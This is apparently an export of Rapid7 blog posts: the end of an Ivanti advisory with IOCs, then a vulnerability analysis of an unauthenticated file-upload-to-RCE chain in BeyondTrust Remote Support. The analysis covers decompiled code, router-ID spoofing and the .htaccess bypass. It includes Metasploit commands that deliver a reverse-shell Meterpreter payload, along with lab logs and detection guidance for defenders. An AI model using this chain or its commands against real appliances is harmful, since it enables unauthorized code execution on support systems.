-Rapid7 also recommends investigating for compromise after patching. Volexity reports that the observed activity evades Ivanti's Integrity Checker Tool, so a clean result does not rule out compromise. Preserve memory and logs before rebooting or resetting where feasible. If compromise is suspected, follow Ivanti's recovery steps and rotate potentially exposed credentials.
-
-For current fixed versions and mitigation guidance, refer to Ivanti's security advisory. Its linked recovery procedure includes older release references.
-
-Artifacts, evidence sources, and IOCs
-
-The following guidance and artifacts are from Volexity's investigation:
-
-Hunting guidance:
-
-Review requests to /dana-na/auth/url_default/welcome.cgi, especially URL/header mismatches involving X-DSCGI-PATH. Observed values include:
-
-X-DSCGI-PATH: /home/webserver/htdocs/dana/fb/smb/wu.cgi X-DSCGI-PATH: /home/runtime/tmp/<MD5(filename)>
-
-Evidence sources on the appliance:
-
-/tmp/: ml.py, rq5.py, mk.py, rr.py, pu.txt, sp_out.txt, and spray_hits.json.
-
-/data/.icscap/: dsstatmond, cap*, and h.py.
-
-/home/runtime/tmp/: ics-root-run-inband-*.pl and ics-root-result-inband-*.
-
-/home/runtime/dlogs/debuglog and /var/log/audit/audit.log: investigate evidence of selective deletion.
-
-Network IOCs:
-
-108.165.147[.]64: UTA0576 exploitation IP, per Volexity's IOC list.
-
-Volexity also provides YARA rules for request-header evidence and the privilege escalation payload in memory.
-
-Rapid7 customers
-
-Exposure Command, Vulnerability Management, and Nexpose
-
-Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-111357 and CVE-2026-118527 with authenticated vulnerability checks available since the 2026-10-30 content release.
-
-Updates
-
-November 2, 2026: Initial publication."
-a4c4fa3b52d7,a4c4fa3b52d7,2026-10-30 16:01 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,File Security; Vulnerability Management; Identity Security Posture Management; Network Security,Article,Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764),https://www.rapid7.com/blog/post/ra-rapid7-analysis-unauthenticated-file-upload-to-rce-in-beyondtrust-remote-support-cve-2026-102764,Overview An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user,"Overview
-
-An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required.
-
-The flaw sits between the internal message router, brain, and an appliance-side customer worker, thin-scc. An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider.
-
-We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets.
-
-We tested Remote Support 24.1.2, build 1524046, revision 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3. The test appliance had public issue-menu session starts and thin chat enabled (default). Other affected releases and fixed builds have not been established. The VM's base appliance version of Secure Remote Access, 7.1.0, is separate from the Remote Support application version.
-
-Impact
-
-The attacker controls both the contents of an uploaded file and its destination path, subject to the worker's filesystem permissions. The same origin forgery also reaches the file-send operation. We used it to retrieve /proc/self/environ to determine the base installation path of the Remote Support before dropping the payload
-
-On the tested appliance, the native file service could write into the PHP document root. The Metasploit module returns code execution in the context of msfuser, UID 1000, which establishes unauthenticated remote code execution as the site user.
-
-Technical Analysis
-
-We will demonstrate how an attacker can start an anonymous session and then forge a message that the appliance will accept as local. Then outline how we can reach the native file transfer service, choose the uploaded file’s contents and destination and turn the file write into PHP execution.
-
-Addresses use Ghidra image base 0x100000. Subtract that value for the raw ELF virtual address. Function names beginning with FUN_ are Ghidra labels; descriptive names are taken from diagnostic strings where available.
-
-Starting an anonymous customer session
-
-We begin by obtaining two customer keys from POST /api/start_session. These are fresh public guest sessions. The keys let the client use the customer transport, but do not identify a logged-in account. Each guest connects through the /nw WebSocket endpoint, using either the native or thin customer protocol.
-
-source/app/write_app_chooser_config:
-
-echo ""ingredi support desk customer:|$BG_app_root/data/tmp/brain.sock"" # [A1] echo ""ingredi support desk customer thin:$BG_app_root/app/thin-scc-wrapper"" # [A2]
-
-app/write_app_chooser_config shows where the two customer protocols go. The native protocol reaches the brain socket at [A1]; the thin protocol launches a wrapper at [A2].
-
-source/app/thin-scc-wrapper:
-
-# ... omitted: protocol parsing and the alternative debug-site branch ... quoted=$(export PHPRC=""$BG_app_root/config/php-cli.ini""; echo $gskey | $ingrediRoot/app/dbquote) if [[ $(echo ""SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())"" | $db) != ""1"" ]]; then # [A3] echo ""1 failure"" >&0 exit 0 fi # ... omitted: reconnect throttling, customer-name setup, and settings generation ...
-
-app/thin-scc-wrapper checks that the thin customer's key belongs to an unexpired sdcust session at [A3]. A key obtained through the public session-start endpoint passes this check.
-
-app/thin-scc-wrapper, after the session check:
-
-echo ""0 success"" >&0 workDir=`handleThinMint ""$thinMint""` || exit if [[ ! -f ""$workDir/thin-scc"" ]]; then pushd ""$workDir"" cp $ingrediRoot/app/thin-scc . # ... omitted: license, image, and settings.ini setup ... else pushd ""$workDir"" fi export BRAIN_MELD_SOCKET_PATH=$ingrediRoot/data/tmp/brain.sock # ... omitted: server-side environment initialization ... ./thin-scc # [A4] Starts the worker inside the appliance environment. exitStatus=$?
-
-The same wrapper then prepares a working directory and starts thin-scc at [A4]. This process runs on the appliance, even though it is handling an anonymous customer's thin session.
-
-The native connection gives us a client for the internal message-routing system, referred to here as MRS. The thin connection gives us an appliance-side worker to address. Neither step requires a representative to accept the session.
-
-A network message can claim to be local
-
-MRS addresses have three parts: node:router:handler. Each message carries source and destination addresses in a 36-byte header made up of nine little-endian 32-bit fields.
-
-Header offset
-
-Field
-
-Value used by the exploit
-
-0x04
-
-Source node
-
-The customer's normal node
-
-0x08
-
-Source router
-
-Changed to the reserved value 1
-
-0x0c
-
-Destination node
-
-The worker's node
-
-0x10
-
-Destination router
-
-The worker's router
-
-0x14
-
-Destination handler
-
-Main dispatcher, 2048, on the tested build
-
-0x24
-
-Payload
-
-Service name, newline, then packed fields
-
-app/brain — ingress check:
-
-if (*(int *)((long)param_2 + 0xc) == *(int *)(param_1 + 0x10)) { *(uint *)(param_2 + 4) = (uint)*(byte *)(param_2 + 4); if ((*(int *)(param_2 + 1) == *(int *)((long)param_1 + 0x84)) && (param_3 != (ulong **)0x0)) { // [B1] Rejects a network claim of this router's actual ID. if (lRam0000000001ec8610 != 0) { func_0x0168de00( 0x15, 3, ""dropping spoofed message that came in from the network but has a routerID of our own\n"" ); } } else if (*(int *)((long)param_1 + 0x84) == *(int *)(param_2 + 2)) { // ... omitted: delivery to a handler on this router ... } else { // ... omitted: TTL checks, route lookup, and forwarding branches ... } }
-
-app/brain has an anti-spoofing check in FUN_01566ae0, identified by its handleMessageFromOtherRouter diagnostic. At [B1], it rejects a network packet whose source router matches the receiving router's actual ID.
-
-Here, param_1 is the receiving router, param_2 is the packet, and param_3 is the incoming connection. Because param_2 points to eight-byte elements, *(int *)(param_2 + 1) reads the source router at byte offset 0x08.
-
-That leaves a gap: the check compares against the actual router ID, while downstream code also recognises a reserved local alias. On this appliance, the alias is 1.
-
-// ... omitted: destination route resolution, loop checks, and diagnostic logging ... FUN_0155ec40( ppuStack_1300, ppuVar6, param_2, // [B2] Forwards the packet carrying the caller-supplied source router. (int *)((long)param_2 + 0x24) );
-
-The forwarding path in the same app/brain function passes the packet onward at [B2]. It does not remove the source claim that matters to the worker's local-origin check.
-
-app/brain — local-address predicate:
-
-bool FUN_0155ad40(long param_1, int *param_2) { bool bVar1; bVar1 = false; if (*param_2 == *(int *)(param_1 + 0x80)) { // [C1] Address node must match the local node. bVar1 = true; if (param_2[1] != 1) { // [C2] Router 1 returns true without the actual-ID comparison. return *(int *)(param_1 + 0x84) == param_2[1]; } } return bVar1; }
-
-The local-address predicate makes the mismatch clear. In app/brain, FUN_0155ad40 first checks the node at [C1]. If that matches, router 1 is enough to return true at [C2]; the comparison with the actual local router is skipped.
-
-The rule is effectively node AND (router == 1 OR router == actual local router). An address supplied by a network client is being used to make that decision.
-
-app/thin-scc — message-origin wrapper:
-
-UNRECOVERED_JUMPTABLE = *(code **)(**(long **)(*param_1 + 8) + 0x50); (*UNRECOVERED_JUMPTABLE)( *(long **)(*param_1 + 8), param_1 + 0xb, // [C3] Uses the dispatched message's sender address at byte offset 0x58. UNRECOVERED_JUMPTABLE );
-
-The corresponding message wrapper in app/thin-scc, passes the message's sender address into its router object's local-address predicate at [C3]. Ghidra did not recover a reliable prototype for this indirect call; the caller consumes its result as a boolean.
-
-We checked this behaviour with the same file-service request under two origins. The ordinary customer source produced no file-service connection during a two-second observation. Changing the source router to 1 caused the worker to accept it.
-
-Reaching the native file-transfer service
-
-In app/thin-scc, FUN_0047a850 dispatches file-transfer messages.
-
-app/thin-scc — file-transfer dispatcher:
-
-cVar3 = func_0x0068e930(param_2); // [D1] Locality is derived from the message sender address. if (cVar3 == '\0') { if (lRam00000000009bade8 != 0) { puVar5 = (undefined8 *)func_0x0068efe0(param_2); func_0x00309380(0x66, 3, ""DISCARDING NONLOCAL MESSAGE: %s\n"", *puVar5); } } else { func_0x0046d370(aplStack_68, ""ftsName""); lVar7 = param_2 + 0x28; lVar1 = param_2 + 0x30; lVar6 = func_0x002a1970(lVar7, aplStack_68); if (lVar1 == lVar6) { puVar5 = (undefined8 *)0x9c3700; } else { puVar5 = (undefined8 *)(lVar6 + 0x40); } if ((puVar5[1] == *(long *)(param_1 + 0x2a8)) && ((puVar5[1] == 0 || (iVar4 = func_0x001804b0(*puVar5, *(undefined8 *)(param_1 + 0x2a0)), iVar4 == 0)))) { // [D2] Matches the requested filesystem service name. // ... omitted: string cleanup, optional reply check, and action dispatch shown below ... } // ... omitted: mismatched-name cleanup ... }
-
-It calls the origin wrapper at [D1] and discards a message if that wrapper says the sender is nonlocal. Once that check passes, [D2] matches ftsName against the service instance's name.
-
-The same function only validates responseAddress when the field is nonempty. The exploit omits it, taking the branch at [D3].
-
-app/thin-scc, reply-address handling in FUN_0047a850:
-
-func_0x0046d370(auStack_a8, ""responseAddress""); lVar6 = func_0x002a1970(lVar7, auStack_a8); if (lVar6 == lVar1) { lVar6 = 0x9c3700; } else { lVar6 = lVar6 + 0x40; } if (*(long *)(lVar6 + 8) == 0) { // [D3] No reply-address validation when the field is empty. func_0x001edfe0(auStack_a8); } else { func_0x0046d370(auStack_88, ""responseAddress""); lVar8 = func_0x002a1970(lVar7, auStack_88); lVar6 = lVar8 + 0x40; if (lVar8 == lVar1) { lVar6 = 0x9c3700; } func_0x006f2e80(auStack_b4, lVar6); func_0x0046d370(aplStack_68, ""processMessage""); cVar3 = func_0x0068e950(param_2, aplStack_68, auStack_b4); // [D4] // ... omitted: temporary string destruction ... if (cVar3 == '\0') goto LAB_0047a8be; }
-
-The validator called at [D4] compares the reply address against the message's sender address. It does not independently establish where that sender came from, so making this field mandatory would not fix the origin forgery.
-
-app/thin-scc, action handling in FUN_0047a850:
-
-// ... omitted: action extraction and unrelated action cases ... iVar4 = func_0x0046d240(uVar9, uVar2, ""DownloadAnonymousFiles""); if (iVar4 == 0) { uVar9 = FUN_00475820(param_1, param_2); // [D5] Receives a file into the selected provider. goto LAB_0047a8c0; } // ... omitted: DownloadFiles case ... iVar4 = func_0x0046d240(uVar9, uVar2, ""UploadFiles""); if (iVar4 == 0) { uVar9 = FUN_00477be0(param_1, param_2); // [D6] Sends a file from the selected provider. goto LAB_0047a8c0; }
-
-The dispatcher then exposes DownloadAnonymousFiles at [D5] and UploadFiles at [D6].
-
-The action names describe the worker's side of the transfer. DownloadAnonymousFiles receives bytes onto the appliance; UploadFiles sends a file out. To upload our file, we ask the worker to download it from an MRS listener we control.
-
-The important thing to note here is that the worker has more than one filesystem provider. The session service delegates filesystem work to the browser. A successful transfer through that service does not prove a file was written on the appliance. The local service uses native file objects instead.
-
-app/thin-scc — native service construction:
-
-uVar3 = func_0x00770620(0x310); plVar4 = (long *)func_0x00770620(8); func_0x003454a0(plVar4); // [E1] Constructs the native filesystem provider. pplStack_c0 = (long **)0x0; plStack_c8 = plVar4; pplStack_c0 = (long **)func_0x00770620(0x18); plVar1 = _DAT_007d4de0; pplStack_c0[2] = plVar4; pplStack_c0[1] = plVar1; *pplStack_c0 = (long *)&UNK_0098cee0; plStack_60 = (long *)0x5; uStack_58 = (long *)CONCAT26(uStack_58._6_2_, 0x6c61636f6c); // [E2] ASCII ""local"". plStack_68 = &uStack_58; FUN_00472550(uVar3, &plStack_68, param_3, &plStack_c8); // [E3] Service receives name and provider. param_1[0x9d] = uVar3; // ... omitted: string/provider reference cleanup and other ServerContext services ...
-
-The ServerContext constructor in app/thin-scc, FUN_002ae620, creates that native provider at [E1]. It builds the name local at [E2] and passes both to the file-transfer service constructor at [E3].
-
-The exploit therefore uses ftsName=local. The native file factory analysis follows this provider to the native file and filesystem-info constructors.
-
-Choosing the file contents and destination
-
-app/thin-scc, FUN_00475820 , handles DownloadAnonymousFiles.
-
-app/thin-scc — anonymous-download request:
-
-// ... omitted: overwrite/resume options and transfer metadata setup ... func_0x0046d370(aplStack_128, ""downloadToken""); lVar8 = func_0x002a1970(lVar12, aplStack_128); lVar6 = lVar8 + 0x40; if (lVar8 == param_2) { lVar6 = 0x9c3700; } func_0x001edf30(&puStack_68, lVar6); // [F1] Caller-supplied transfer token. func_0x0046d370(aplStack_148, ""serverAddress""); lVar8 = func_0x002a1970(lVar12, aplStack_148); lVar6 = lVar8 + 0x40; if (lVar8 == param_2) { lVar6 = 0x9c3700; } func_0x006f2e80(auStack_1e4, lVar6); // [F2] Caller-supplied MRS file-server address. func_0x0046d370(aplStack_168, ""path""); lVar8 = func_0x002a1970(lVar12, aplStack_168); lVar6 = lVar8 + 0x40; if (lVar8 == param_2) { lVar6 = 0x9c3700; } func_0x001edf30(aplStack_88, lVar6); // [F3] Caller-supplied destination path. uVar13 = (ulong)(iVar4 != 0); iStack_1e8 = func_0x004a21c0( param_1, aplStack_88, auStack_1e4, &puStack_68, auStack_198, iVar5 == 0 ); // [F4] Starts the download using the supplied path, server, and token. // ... omitted: temporary destruction and transfer-response construction ...
-
-The function reads the request's transfer token at [F1], MRS server address at [F2], and destination path at [F3]. All three reach the download routine at [F4].
-
-In this excerpt, lVar12 points to the request's field map. param_2 has already been advanced to its map-end sentinel; 0x9c3700 represents an absent value.
-
-app/thin-scc — MRS download connection:
-
-(**(code **)(**(long **)(param_1 + 8) + 0x18))( &lStack_d8, *(long **)(param_1 + 8), param_3, 10000 ); // [G1] Connects to the serverAddress supplied to this routine as param_3. if ((lStack_d8 == 0) || ((*(char *)(lStack_d8 + 0x30) != '\0' && (*(char *)(lStack_d8 + 0x31) != '\0')))) { uVar4 = 0; } else { // ... omitted: request-map initialization ... func_0x00490020(&plStack_68, ""request""); lVar5 = func_0x00202790(auStack_b8, &plStack_68); func_0x001f5f10( lVar5, 0, *(undefined8 *)(lVar5 + 8), ""get anonymous file"", 0x12 ); // [G2] // ... omitted: temporary key-string destruction ... func_0x00490020(&plStack_68, ""token""); uVar6 = func_0x00202790(auStack_b8, &plStack_68); func_0x001ee710(uVar6, param_4); // [G3] Copies the caller's downloadToken. // ... omitted: info field, serialization, send, and receive-thread setup ... }
-
-The download routine at 0x004a21c0 opens an MRS stream to our address at [G1]. It sends get anonymous file at [G2] with our token at [G3]. The token can be a 24 character random string because we control the listener.
-
-// ... omitted: stream setup, relay metadata, and reference management ... puVar7 = (undefined8 *)func_0x00770620(0x450); // ... omitted: temporary setup and resume calculation ... func_0x004a0700(puVar7, param_1, param_5, bVar8, param_7, param_8); puVar7[0x81] = lStack_d8; puVar7[0x82] = lVar5; *puVar7 = &UNK_0099d3f8; // ... omitted: relay address and transfer bookkeeping ... func_0x001ee710(puVar7 + 0x13, param_2); // [G4] Retains the requested destination path. // ... omitted: transfer registration and reference management ... func_0x002fcae0(puVar7, 0x400000); // [G5] Starts the receive-files thread.
-
-The same app/thin-scc routine puts the destination path into a receive-files thread at [G4] and starts it at [G5].
-
-app/thin-scc — receive-files loop:
-
-// ... omitted: ""want file?"" command match ... func_0x00490020(ppplVar20, ""dest_filename""); uVar12 = func_0x00202790(plStack_888, ppplVar20); puStack_8b8 = &uStack_418; func_0x001edf30(puStack_8b8, uVar12); // [H1] Copies the destination from transfer metadata. // ... omitted: provider filesystem-info query and reference cleanup ... bStack_931 = *(byte *)(plStack_848 + 0x1c); pplStack_8d8 = (long **)(((ulong)pplStack_8d8 & 0xffffffffffffff00 | (ulong)bStack_931) ^ 1); puStack_900 = auStack_3f8; if (bStack_931 == 1) { func_0x001edf30(puStack_900, puStack_8b8); } else { func_0x001fabe0(puStack_900, puStack_8b8, "".n$t""); // [H2] Temporary receive path. }
-
-The receive loop at 0x001d6430 consumes the file metadata we send over that stream. It copies dest_filename at [H1]. Depending on the provider's file information, it receives into that path or a temporary path ending in .n$t at [H2].
-
-// ... omitted: ""begin file"" handling and provider file-object creation ... func_0x00321f50(plStack_828, puStack_928); plVar11 = plStack_828; pcVar19 = *(code **)(*plStack_828 + 0xc0); func_0x00490020(ppplVar20, ""a+b""); cVar5 = (*pcVar19)(plVar11, puStack_900, ppplVar20, lStack_908); // [H3] Opens the receive file. // ... omitted: open-failure handling, positioning, and transfer-loop branches ... iVar7 = (**(code **)(*plVar11 + 0x20))(plVar11, plVar1, pplVar21, pplVar25, 1); if (0 < iVar7) { pplStack_8d8 = (long **)(long)iVar7; lVar14 = *plStack_828; *(long *)(param_1 + 0x160) = (long)pplStack_8d8 + *(long *)(param_1 + 0x160); *(long *)(param_1 + 0x168) = (long)pplStack_8d8 + *(long *)(param_1 + 0x168); iVar9 = (**(code **)(lVar14 + 0xd8))(plStack_828, plVar1); // [H4] Writes received data. if (iVar7 != iVar9) { // ... omitted: errno extraction and ""error writing to file"" response ... } // ... omitted: progress and completion handling ... }
-
-After the omitted begin file code has executed, the same app/thin-scc receiver opens the file at [H3] and writes incoming data at [H4].
-
-On completion, the receiver closes the file and, when a temporary path is used, renames it to the final destination. The service already accepts an absolute destination path, so no directory traversal is needed. The worker allows the request because it trusts the forged local source address.
-
-From file upload to PHP execution
-
-The next step is to choose a writable location that the web server would execute. The supplied config/apache_vhost.conf sets the document root to:
-
-/home/msfuser/ingredi-24.1.2/app/www/public
-
-An absolute upload into that directory succeeded. There is a small catch when requesting the file: a URL ending in .php returns 404, even while the file existed. app/www/public/.htaccess explains why.
-
-source/app/www/public/.htaccess:
-
-# ... omitted: application routes and compatibility rewrites ... RewriteCond %{THE_REQUEST} ""^[^ ]* .*?\.php[?/ ].*$"" # [I1] Direct .php URLs return 404. RewriteRule .* - [L,R=404] # ... omitted: download-helper routes ... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\.php -f # [I2] An extensionless URL executes the existing PHP file. RewriteRule ^(.+)$ $1.php [L]
-
-The rule at [I1] rejects a direct .php request. The rule at [I2] maps an extensionless URL to an existing PHP file.
-
-Requesting the uploaded basename without .php executed our payload. It returned its absolute filename, EUID 1000, and the output of id.
-
-We also wanted to avoid guessing Remote Support’s working directory or the versioned installation name. The same native service can send us the worker's /proc/self/environ using UploadFiles. On this appliance, it contains:
-
-BG_app_root=/home/msfuser/ingredi-24.1.2 BRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock
-
-BG_app_root gives us the installation directory directly. Appending /app/www/public gives the upload destination; the socket path provides another way to identify the same root. There is one protocol wrinkle: procfs reports the environment file's size as zero, but the worker still streams its contents. We have to read through the data stream's EOF instead of stopping at the advertised size.
-
-Exploit
-
-The Metasploit module carries out the chain using two fresh public customer sessions. It discovers the thin worker through Director.GetGatewaySessionValues for its own thin guest, sends the forged LocalFileTransfer request to the worker's main dispatcher, and serves the PHP bytes over its existing MRS connection. A separate upload server is not needed.
-
-The module writes a random PHP filename into the site's public directory, then POSTs an execution token to the extensionless URL. The PHP file checks that token and unlinks itself before executing the payload. Target 0 runs a PHP payload; target 1 wraps a Unix command in PHP.
-
-For a PHP Meterpreter payload, the basic configuration is:
-
-use exploit/linux/http/beyondtrust_rs_mrs_file_upload set RHOSTS 192.168.1.98 set TARGET 0 set PAYLOAD php/meterpreter/reverse_tcp set LHOST 192.168.1.68 run verbose=true
-
-Select target 0 and a compatible command payload, such as php/meterpreter/reverse_tcp. The module documentation covers the directory override and other options.
-
-Figure 1: Exploiting the anonymous file-transfer service with Metasploit.
-
-Testing produced two PHP Meterpreter sessions, a command-wrapped PHP Meterpreter session, and a Bash shell. Both targets also ran with AutoCheck disabled, and immediate repeat exploitation succeeded. The Bash shell returned:
-
-uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),16(cron),70(postgres)
-
-IOCs
-
-The excerpts below cover HTTP requests, native file-transfer activity in thin-scc, and customer connections recorded by brain. They come from our lab runs on 28–29 October 2026. Original timestamps, addresses, and paths are retained; session and transfer tokens are redacted where noted. Unrelated entries are omitted.
-
-The site logs are stored under $BG_app_root/log/, where BG_app_root identifies the Remote Support installation directory:
-
-Log
-
-Evidence shown below
-
-httpd_access.log
-
-Public session creation and requests to uploaded PHP endpoints
-
-thin-scc.log
-
-Native file-transfer stream creation and routing errors
-
-thin-scc-errors.log
-
-Rejected file-transfer requests, including the action and destination path
-
-brain.log
-
-Customer connection records with client addresses and timestamps
-
-Active workers also keep logs under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/; the collection details below explain how these reach the site log directory. The installation path varies between appliances.
-
-Requests to an uploaded PHP endpoint
-
-The command-only Metasploit run created two public customer sessions, invoked its uploaded PHP endpoint, and then checked that the endpoint had gone. The relevant access-log lines are:
-
-192.168.1.68 [28/Oct/2026:21:12:23 +0000] ""POST /api/start_session HTTP/1.1"" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:23 +0000] ""POST /api/start_session HTTP/1.1"" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:31 +0000] ""POST /qdgusthrmlirprls HTTP/1.1"" [0s] [Stat:200] [Size:0] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:38 +0000] ""POST /qdgusthrmlirprls HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:43 +0000] ""GET /qdgusthrmlirprls HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]
-
-Here, /qdgusthrmlirprls mapped to qdgusthrmlirprls.php in the public directory. The first POST ran the command and returned 200. The later POST was the module's cleanup request; the GET independently checked the endpoint. Both received 404 after the file had deleted itself.
-
-This gives defenders a sequence to investigate: public session creation followed by a request to a new, unfamiliar endpoint, potentially followed by 404s for the same path. Session creation alone is normal Remote Support activity. A 200 followed by a 404 is also insufficient by itself; correlate the requests with file changes, session records, and any unusual outbound connections.
-
-The URL may not contain .php
-
-The earlier PHP canary produced these lines:
-
-192.168.1.68 [28/Oct/2026:20:50:07 +0000] ""GET /msfcanary03d80193f0880b.php HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9] 192.168.1.68 [28/Oct/2026:20:50:35 +0000] ""GET /msfcanary03d80193f0880b HTTP/1.1"" [0s] [Stat:200] [Size:368] [Ref:-] [UA:Python-urllib/3.9] 192.168.1.68 [28/Oct/2026:20:50:35 +0000] ""GET /msfcanary03d80193f0880b HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]
-
-The direct .php request failed, while the extensionless request executed the same file. The final 404 followed self-deletion. Detection that only searches for requests ending in .php would miss the successful request in this example.
-
-The native transfer itself travels inside the customer MRS connection. These access-log entries show the HTTP trigger, not the file contents or the forged router ID. The captured HTTP log does not expose the inner MRS messages, so it cannot establish the origin bypass on its own.
-
-Files and connections
-
-Look for unexpected PHP files under the site's public directory and receive files ending in .php.n$t. An interrupted transfer may leave the temporary file even if the final URL returns 404. The .n$t suffix also belongs to the normal transfer implementation, so its presence needs context.
-
-Native file-transfer traces
-
-thin-scc.log and thin-scc-errors.log contain more direct evidence of the file-service requests. For example, this line from thin-scc-errors.log names the action, native provider, and intended PHP destination. Only ckey and downloadToken have been redacted:
-
-20261029 17:01:33 999999 thin-scc 11801:proc{LocalFileTransfer}(t11832) FT:WARNING>DISCARDING NONLOCAL MESSAGE: LocalFileTransfer:action=DownloadAnonymousFiles;ckey=<REDACTED>;downloadToken=<REDACTED>;enableResume=0;ftsName=local;path=/home/msfuser/ingredi-24.1.2/app/www/public/envresolve28f788af6a1c39bf.php;serverAddress=1:1022182175:9000;wantOverwritePrompts=0
-
-This was our negative control: the request used the customer's ordinary source address and was rejected. It is evidence of an attempted invocation, not a successful upload. The forged local source passes the check that produces this warning, so a successful exploit need not leave a DISCARDING NONLOCAL MESSAGE entry.
-
-The successful PHP module run left these lines in thin-scc.log:
-
-20261029 17:06:37 319 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_STREAM:INFO>createStream: connecting to address 1:1129726787:1031 20261029 17:06:37 2 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_CL:ERROR>nodeID not found in node list even after renumerating: 0 20261029 17:06:37 0 thin-scc 14419:proc{LocalFileTransfer}(t14486) MSG_DSP:ERROR>failed to create a mailbox for sending to: 0:0:0
-
-Our requests omit responseAddress. The handler starts the transfer, then tries to send its action response to an empty address. That produces the 0:0:0 error without preventing the file write. The payload callback independently confirms execution at 17:06:37.
-
-Look for this combination in the proc{LocalFileTransfer} context, especially around unfamiliar PHP requests or outbound connections. The 1:1129726787:1031 value identifies an internal MRS mailbox; use the brain connection records below for the client IP. These entries do not identify the written filename or prove execution on their own. The empty-address errors also depend on how the exploit request is constructed; another implementation may leave different traces.
-
-Brain connection records
-
-brain.log helps link the activity to a client address. These two entries preceded the same module run:
-
-20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0' 20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1'
-
-These are useful for a timeline, but customer connections are normal activity. We found no UploadFiles or DownloadAnonymousFiles action records in the captured brain logs. Generic EOF, connection-reset, and conference errors also appeared; they are too broad to treat as exploit indicators by themselves.
-
-Where to collect the native logs
-
-The aggregated logs are under $BG_app_root/log/. While a worker is running, its own logs are under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/. The wrapper appends those logs to the site's log directory when the worker exits, then clears the per-worker copies. Collect both locations when investigating a live session.
-
-The captured brain.ini and thin-scc.ini both had the debug output disabled with enabled=0. No debug log was captured, and we did not change the logging configuration. Brain's debug configuration also limits MRS_* categories to Info, so enabling its debug output alone would not guarantee detailed message payloads.
-
-Names such as UploadFileStarted and DownloadFileEnded occur in the native protocol's callback code, but we did not find them in the collected logs. They should not be presented as default audit events"
